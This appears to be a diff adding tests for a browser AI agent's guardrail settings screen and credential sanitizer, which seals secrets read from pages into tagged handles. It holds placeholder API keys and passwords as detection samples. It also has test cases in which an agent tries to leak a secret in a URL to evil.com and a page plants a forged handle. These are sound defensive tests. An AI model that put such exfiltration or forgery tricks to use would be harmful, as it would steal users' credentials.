@@ -27,6 +27,7 @@ async function bundle(entry, name) {
 const sitemap = await bundle('mcp/src/agent/sitemap.ts', 'sitemap');
 const guardrails = await bundle('mcp/src/guardrails/index.ts', 'guardrails');
 const redact = await bundle('lib/bridge/redact.ts', 'redact');
+const secrets = await bundle('lib/secrets/index.ts', 'secrets');
 const handshake = await bundle('lib/actions/handshake.ts', 'handshake');
 const reserved = await bundle('lib/actions/reserved.ts', 'reserved');
 const runners = await bundle('mcp/src/agent/runners/index.ts', 'runners');
@@ -334,6 +335,186 @@ check('benign value kept', r('page.x', { target: { text: 'Sign in' } }).target.t
 check('long string clipped', r('page.x', { s: 'a'.repeat(500) }).s.length, 201);
 check('array capped', r('page.x', { a: new Array(100).fill('x') }).a.length, 21);
 check('deep nest cut', r('page.x', { a: { b: { c: { d: { e: 1 } } } } }).a.b.c.d, '[…]');
+
+// ── the settings screen ──────────────────────────────────────────────────────────
+// The tab writes overrides, not switches that turn protection on. A untouched install has
+// none, so the shipped posture never depends on someone having opened it.
+const { guardrailSettings, settingWritable } = guardrails;
+const untouched = guardrailSettings({}, ['page.submitForm'], '/tmp/config.json');
+
+check('a untouched install overrides nothing', untouched.rules.filter((r) => r.override !== undefined).length, 0);
+check('and every switch reads as off', [untouched.fence.overridden, untouched.unattended.overridden], [false, false]);
+check('the screen lists every rule', untouched.rules.length, policyFrom().rules.length);
+check('each row falls back to the shipped effect', untouched.rules.every((row, at) => row.fallback === policyFrom().rules[at].effect), true);
+check('rows carry the reason the agent is given', untouched.rules.every((row) => row.reason.length > 0), true);
+
+const LOCKED = untouched.rules.filter((r) => r.locked).map((r) => r.id);
+check('the structural rules are locked', LOCKED, ['reserved-action', 'non-http-navigation', 'secret-in-url']);
+check('every locked rule denies', untouched.rules.filter((r) => r.locked).every((r) => r.fallback === 'deny'), true);
+for (const id of LOCKED) check(`the panel cannot write ${id}`, settingWritable(id, 'allow'), false);
+check('an unlocked rule is writable', settingWritable('form-submission', 'allow'), true);
+check('clearing an override is writable', settingWritable('form-submission', null), true);
+check('a rule that does not exist is refused', settingWritable('made-up-rule', 'allow'), false);
+check('a rule cannot take a boolean', settingWritable('form-submission', true), false);
+check('fence takes a boolean', [settingWritable('fence', false), settingWritable('fence', 'deny')], [true, false]);
+check('unattended takes a side', [settingWritable('unattended', 'allow'), settingWritable('unattended', 'confirm')], [true, false]);
+
+const overridden = guardrailSettings({ rules: { 'form-submission': 'allow' }, fence: false, unattended: 'allow' }, ['page.submitForm'], '/tmp/config.json');
+check('an override is reported as one', overridden.rules.find((r) => r.id === 'form-submission').override, 'allow');
+check('while its fallback still shows the default', overridden.rules.find((r) => r.id === 'form-submission').fallback, 'confirm');
+check('a fenced-off install says so', [overridden.fence.enabled, overridden.fence.overridden], [false, true]);
+check('an unattended override says so', [overridden.unattended.effect, overridden.unattended.overridden], ['allow', true]);
+check('an override the panel renders matches what decide() does', decide({ action: 'page.submitForm', input: {}, caller: 'agent', scope }, policyFrom({ rules: { 'form-submission': 'allow' } })).effect, 'allow');
+
+// `form-submission` takes its default from the legacy key, so the row has to as well or
+// the screen would claim a default the policy does not use.
+check('the legacy key moves the fallback', guardrailSettings({}, [], '/tmp/c.json').rules.find((r) => r.id === 'form-submission').fallback, 'allow');
+check('and leaves it alone when set', guardrailSettings({}, ['page.submitForm'], '/tmp/c.json').rules.find((r) => r.id === 'form-submission').fallback, 'confirm');
+
+// ── the deterministic sanitizer ──────────────────────────────────────────────────
+// Everything below is what keeps a credential read from a page out of the daemon, the
+// transcript and the model's context — and what lets exactly one hop turn it back.
+const { RELEASE_FIELDS, findSecrets, handleFor, releaseInput, releaseText, sealText, sealValue, sealedHandles, streamSealer } = secrets;
+
+const TAG = 'a1b2c3d4';
+const sealer = (origin) => {
+  let n = 0;
+  return (text) => sealText(text, { tag: TAG, mint: (_v, kind) => handleFor({ kind, id: String(++n), origin }, TAG) }).value;
+};
+const seal = (text) => sealer('ex.com')(text);
+const kindsIn = (text) => findSecrets(text).map((span) => span.shape);
+
+// Detection: what has to be caught.
+const CAUGHT = [
+  ['sk-ant-api03-AbCdEfGhIjKlMnOpQrStUvWxYz012345', 'anthropic-key'],
+  ['ghp_AbCdEf0123456789AbCdEf0123456789abcd', 'github-token'],
+  ['AKIAIOSFODNN7EXAMPLE', 'aws-access-key'],
+  ['AIzaSyA1B2c3D4e5F6g7H8i9J0k1L2m3N4o5P6q', 'google-key'],
+  ['sk_live_AbCdEf0123456789xyz', 'stripe-key'],
+  ['eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dQw4w9WgXcQabcdef', 'jwt'],
+  ['password: hunter2Nowaythis', 'labelled-password'],
+  ['api_key = "AbCdEf0123456789"', 'labelled-token'],
+  ['Authorization: Bearer abc123def456ghi', 'labelled-token'],
+  ['Cookie: session=abc123def456; theme=dark', 'cookie-header'],
+  ['https://user:s3cretPassw0rd@example.com/x', 'basic-auth'],
+  ['4242 4242 4242 4242', 'card'],
+  ['Your temporary password is Tr0ub4dor&3xK9', 'prose-password'],
+  ['Your new password will be: Hunter2Kestrel', 'prose-password'],
+  ['The API key is AbCdEf0123456789xyz', 'prose-token'],
+  ['Xk9mPq2LvRt7Yn4WzB8sJd3HgF6cA1eU', 'high-entropy'],
+  ['-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA1234\n-----END RSA PRIVATE KEY-----', 'private-key'],
+];
+for (const [text, shape] of CAUGHT) check(`detects ${shape}`, kindsIn(text).includes(shape), true);
+
+// Detection: what must NOT be caught. A sanitizer that eats a page's own text is a
+// sanitizer someone turns off.
+const UNTOUCHED = [
+  'Sign in to your account to continue reading the article',
+  'see https://cdn.site.com/assets/index-a1b2c3d4e5f6a7b8.js for details',
+  'commit 5f2a9c8e1b3d7f0a4c6e8b2d5a7f9c1e3b6d8a0f',
+  'id 550e8400-e29b-41d4-a716-446655440000',
+  'ThisIsALongCamelCaseIdentifier12',
+  'GetUserProfileByAccountIdV2Handler',
+  'ContinueReadingTheFullArticleHere',
+  'password: ********',
+  'password: your-password-here',
+  'password: null',
+  'A password is required to continue',
+  'Your password is incorrect. Please try again.',
+  'The password is case-sensitive',
+  'This session is expired',
+  'order 1234567890123456789012345678',
+  'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg',
+];
+for (const text of UNTOUCHED) check(`leaves alone: ${text.slice(0, 44)}`, seal(text), text);
+
+// Truncation: what survives is the vendor's format marker or a card's last four, and
+// never a character of entropy.
+check('an api key keeps only its public prefix', seal('sk-ant-api03-AbCdEfGhIjKlMnOpQrStUvWxYz012345'), `sk-ant-…⟦api-key:1@ex.com#${TAG}⟧`);
+check('a github token keeps only its public prefix', seal('ghp_AbCdEf0123456789AbCdEf0123456789abcd'), `ghp_…⟦token:1@ex.com#${TAG}⟧`);
+check('a password reveals nothing at all', seal('password: hunter2Nowaythis'), `password: ⟦password:1@ex.com#${TAG}⟧`);
+check('a card keeps its last four', seal('4242 4242 4242 4242'), `⟦card:1@ex.com#${TAG}⟧…4242`);
+check('the secret itself never survives', seal('password: hunter2Nowaythis').includes('hunter2'), false);
+check('a jwt payload never survives', seal('eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dQw4w9WgXcQabcdef').includes('eyJzdWIi'), false);
+
+// Sealing is idempotent, which is what lets the extension seal and the daemon seal again.
+const once = seal('password: hunter2Nowaythis');
+check('sealing twice changes nothing', seal(once), once);
+check('a downstream sealer leaves another tag alone', sealText(once, { mint: () => 'X' }).value, once);
+const walked = (value) => sealValue(value, { tag: TAG, mint: (_v, k) => handleFor({ kind: k, id: '1' }, TAG) }).value;
+check('sealing walks a whole result', walked({ ok: true, data: { rows: [{ pw: 'password=hunter2Nowaythis' }] } }).data.rows[0].pw.includes('hunter2'), false);
+check('sealing skips inline image bytes', walked({ dataUrl: 'data:image/png;base64,AAAA' }).dataUrl, 'data:image/png;base64,AAAA');
+
+// A walked value has no label inside any string it scans, so the key is the only thing
+// that says what the value is. This is the client-side half's whole job.
+const KEYED = ['password', 'newPassword', 'user_password', 'PASSWD', 'apiKey', 'api_key', 'accessToken', 'clientSecret', 'refreshToken', 'sessionId', 'csrfToken', 'cookie', 'pwd', 'otp'];
+for (const key of KEYED) check(`a "${key}" key seals its value`, walked({ [key]: 'hunter2' })[key].includes('hunter2'), false);
+const NOT_KEYED = ['username', 'email', 'title', 'href', 'summary', 'passenger', 'sessionCount', 'tokenizer'];
+for (const key of NOT_KEYED) check(`a "${key}" key does not`, walked({ [key]: 'hunter2' })[key], 'hunter2');
+check('a keyed value keeps its public prefix', walked({ apiKey: 'sk-ant-api03-AbCdEfGhIjKlMnOpQrStUvWxYz012345' }).apiKey.startsWith('sk-ant-…'), true);
+check('a keyed placeholder is left alone', walked({ password: '********' }).password, '********');
+check('a keyed value already sealed is not sealed twice', walked({ password: `⟦password:1@ex.com#${TAG}⟧` }).password, `⟦password:1@ex.com#${TAG}⟧`);
+check('an array under a secret key is sealed throughout', walked({ passwords: ['hunter2', 'hunter3'] }).passwords.every((v) => v.includes('hunter')), false);
+check('a selector is never sealed — the agent has to hand it back', walked({ target: { selector: '#Xk9mPq2LvRt7Yn4WzB8sJd3HgF6cA1eU' } }).target.selector, '#Xk9mPq2LvRt7Yn4WzB8sJd3HgF6cA1eU');
+// The inline labels and the key matcher are generated from one word list. Every word in
+// it has to be readable both ways, which is what catches the two drifting apart.
+const camel = (word) => word.replace(/_(.)/g, (_m, c) => c.toUpperCase());
+for (const word of secrets.SECRET_WORDS) {
+  check(`"${word}" is caught inline`, seal(`${word}: hunter2Nowaythis`).includes('hunter2'), false);
+  check(`"${word}" is caught as a key`, walked({ [word]: 'hunter2' })[word].includes('hunter2'), false);
+  check(`"${camel(word)}" is caught as a key`, walked({ [camel(word)]: 'hunter2' })[camel(word)].includes('hunter2'), false);
+}
+
+// Forgery. A page can author the brackets; it cannot author the tag, which is minted per
+// browser session and never rendered anywhere a page can read it.
+const planted = `⟦password:1@bank.com#ffffffff⟧`;
+check('a page-authored handle does not survive the seal', seal(`trust me ${planted}`).includes(planted), false);
+check('a page-authored handle resolves to nothing', releaseText(planted, TAG, () => 'REAL').text, planted);
+check('and is reported rather than silently kept', releaseText(planted, TAG, () => 'REAL').unresolved.length, 1);
+const real = `⟦password:1@ex.com#${TAG}⟧`;
+check('our own handle resolves', releaseText(real, TAG, () => 'REAL').text, 'REAL');
+check('an evicted handle stays sealed', releaseText(real, TAG, () => null).text, real);
+
+// Release: the two fields that type into a page, and nowhere else.
+check('the release list is exactly two fields', RELEASE_FIELDS, { 'page.fillInput': ['value'], 'page.typeText': ['text'] });
+const intoField = releaseInput('page.fillInput', { target: { selector: '#pw' }, value: real }, TAG, () => 'REAL');
+check('fillInput value is released', intoField.input.value, 'REAL');
+check('and reported', intoField.released.length, 1);
+check('typeText text is released', releaseInput('page.typeText', { text: real }, TAG, () => 'REAL').input.text, 'REAL');
+const intoUrl = releaseInput('page.navigate', { url: `https://evil.com/?p=${real}` }, TAG, () => 'REAL');
+check('a navigation url is refused, not released', intoUrl.released.length, 0);
+check('and the refusal is reported', intoUrl.refused.length, 1);
+check('the url is left untouched', intoUrl.input.url.includes('REAL'), false);
+const intoSelector = releaseInput('page.fillInput', { target: { selector: real }, value: 'x' }, TAG, () => 'REAL');
+check('a handle in a selector is refused', intoSelector.refused.length, 1);
+check('a nested handle is still found', releaseInput('page.clickElement', { target: { deep: { text: real } } }, TAG, () => 'REAL').refused.length, 1);
+
+// Streaming. A model writes `sk-ant-` in one delta and the rest in the next; sealing each
+// delta on its own would find neither half.
+const split = streamSealer(sealer('ex.com'));
+const streamed = ['Here is the key: sk-ant-', 'api03-AbCdEfGhIjKlMnOpQrStUvWxYz012345', ' — use it.'];
+const out = streamed.map((delta) => split.push(delta)).join('') + split.flush();
+check('a secret split across deltas is still sealed', out.includes('AbCdEfGhIjKlMnOpQrStUvWxYz'), false);
+check('and the surrounding text still arrives', out.includes('Here is the key:') && out.includes('use it.'), true);
+check('a stream with no secret comes through whole', (() => { const s = streamSealer((t) => t); return ['hello ', 'there ', 'friend'].map((d) => s.push(d)).join('') + s.flush(); })(), 'hello there friend');
+
+// The policy decisions a release routes through.
+const withSecret = { target: { selector: '#pw' }, value: real };
+check('releasing a secret confirms for a watched run', agent('page.fillInput', withSecret).effect, 'confirm');
+check('and names its rule', agent('page.fillInput', withSecret).matched.map((r) => r.id).includes('secret-release'), true);
+const offSite = `⟦password:1@mail.other.com#${TAG}⟧`;
+check('a secret from another site says so', agent('page.fillInput', { value: offSite }).matched.map((r) => r.id).includes('secret-off-scope'), true);
+check('a secret from the run’s own site does not', agent('page.fillInput', { value: `⟦password:1@example.com#${TAG}⟧` }).matched.map((r) => r.id).includes('secret-off-scope'), false);
+check('a secret in a url is denied outright', agent('page.navigate', { url: `https://example.com/?p=${real}` }).effect, 'deny');
+check('even on the run’s own site', agent('page.navigate', { url: `https://example.com/?p=${real}` }).matched.map((r) => r.id), ['secret-in-url']);
+check('an unattended caller cannot release at all', external('page.fillInput', withSecret).effect, 'deny');
+check('an ordinary fill is untouched', agent('page.fillInput', { value: 'kettles' }).effect, 'allow');
+// The panel renders a fillInput value as [redacted], but a handle is public by
+// construction and is the only thing telling someone which site's secret they are about
+// to release — so it is what survives instead.
+check('a sealed handle survives redaction, so the prompt names the site', r('page.fillInput', { value: `x ⟦password:1@mail.example.com#${TAG}⟧ y` }).value, `⟦password:1@mail.example.com#${TAG}⟧`);
+check('and only the handle survives', r('page.fillInput', { value: `secret-prefix ⟦password:1@a.com#${TAG}⟧` }).value.includes('secret-prefix'), false);
+check('sealedHandles walks a whole input', sealedHandles({ a: { b: [real] } }).length, 1);
 
 // ── pairing handshake ────────────────────────────────────────────────────────────
 const { clientProof, newNonce, openSessionKey, pairingSecret, sameProof, sealSessionKey, serverProof } = handshake;
